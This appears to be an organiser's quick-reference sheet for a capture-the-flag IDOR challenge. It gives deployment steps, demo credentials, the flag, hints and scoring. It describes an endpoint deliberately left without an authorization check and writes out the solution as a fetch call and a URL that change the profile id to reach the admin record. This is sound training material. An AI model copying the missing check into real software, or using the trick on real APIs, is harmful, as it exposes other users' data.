# Quick Reference - CTF IDOR Challenge

## 🚀 Quick Start

### Deploy in 3 Steps

```bash
# 1. Push to GitHub
cd /home/nathan/UKM/ctf-idor-challenge
git init && git add . && git commit -m "CTF Challenge"
git remote add origin https://github.com/YOUR_USERNAME/ctf-idor-challenge.git
git push -u origin main

# 2. Go to vercel.com → Import → Select repo → Deploy

# 3. Share URL with participants
```

## 🔑 Demo Credentials

| Username  | Password  | Role     | Has Flag? |
|-----------|-----------|----------|-----------|
| employee1 | pass123   | employee | ❌        |
| employee2 | pass456   | employee | ❌        |
| employee3 | pass789   | employee | ❌        |
| admin     | admin2024 | admin    | ✅        |

## 🎯 Flag

```
ICH{G3l0_D4h_b1s4_1D0R}
```

## 🐛 Vulnerability

**Type**: IDOR (Insecure Direct Object Reference)

**Location**: `api/profile.js` - No authorization check

**Exploit**: Change `id` parameter from `1` to `0` in `/api/profile?id=X`

## 💡 Hints for Participants

### Hint 1 (Easy)
"Try exploring the API endpoints using your browser's Developer Tools."

### Hint 2 (Medium)
"Look at the Network tab. What parameters are being sent to the server?"

### Hint 3 (Hard)
"The admin account has ID 0. Can you access it?"

## 🎓 Solution Methods

### Method 1: Console (Fastest)
```javascript
fetch('/api/profile?id=0').then(r=>r.json()).then(console.log)
```

### Method 2: URL
```
https://your-app.vercel.app/api/profile?id=0
```

### Method 3: localStorage
```javascript
localStorage.setItem('userId', '0'); location.reload();
```

## 📊 Expected Participant Flow

1. ✅ Login with employee credentials
2. ✅ See their own profile
3. 🤔 Open DevTools to explore
4. 🤔 Notice `/api/profile?id=1` request
5. 💡 Try changing `id` parameter
6. 🎉 Get admin profile with flag

## 🔍 Monitoring

### Check Vercel Logs
```
Vercel Dashboard → Project → Functions → profile.js → View Logs
```

### Look for:
- Multiple requests to `/api/profile?id=0`
- Requests from different IPs
- Successful flag retrievals

## ⚠️ Troubleshooting

### Issue: "Method not allowed"
**Solution**: Make sure using GET for `/api/profile` and POST for `/api/login`

### Issue: "User not found"
**Solution**: Check if `data/users.json` is deployed correctly

### Issue: Flag not showing
**Solution**: Verify admin account (id: 0) has `"flag": "ICH{G3l0_D4h_b1s4_1D0R}"`

## 📝 Scoring Suggestions

- **First Blood**: 150 points
- **Standard Solve**: 100 points
- **Time Bonus**: +50 points (if solved within 1 hour)
- **Writeup Bonus**: +25 points (if participant submits detailed writeup)

## 🎤 Challenge Description Template

```
Title: Employee Portal

Description:
Our company has just launched a new employee portal. 
Login with your credentials and explore your profile.

Credentials: employee1 / pass123

Goal: Find the hidden flag!

Hint: Sometimes APIs reveal more than they should...

Difficulty: Medium
Category: Web Security
Points: 100
```

## 📚 Additional Resources

- **Full Documentation**: See `README.md`
- **Technical Details**: See `PENJELASAN_TEKNIS.md`
- **Walkthrough**: See `walkthrough.md` (in artifacts)

## 🎯 Learning Objectives

After solving, participants should understand:
- ✅ How APIs work
- ✅ Authentication vs Authorization
- ✅ IDOR vulnerability
- ✅ Browser DevTools for security testing

---

**Need Help?** Check the full documentation in README.md and PENJELASAN_TEKNIS.md
